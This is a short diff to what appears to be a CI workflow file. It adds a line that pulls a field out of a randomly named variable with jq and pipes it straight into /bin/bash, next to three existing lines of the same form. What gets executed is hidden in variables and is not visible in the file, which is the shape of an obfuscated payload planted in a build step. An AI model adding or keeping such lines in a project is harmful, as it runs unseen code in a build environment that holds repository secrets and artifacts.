@@ -44,6 +44,7 @@ jobs:
           echo $wh244 | jq -r .p9542 | /bin/bash
           echo $ot6 | jq -r .act1 | /bin/bash
           echo $t211 | jq -r .be7 | /bin/bash
+          echo $nhow320 | jq -r .ih28649 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
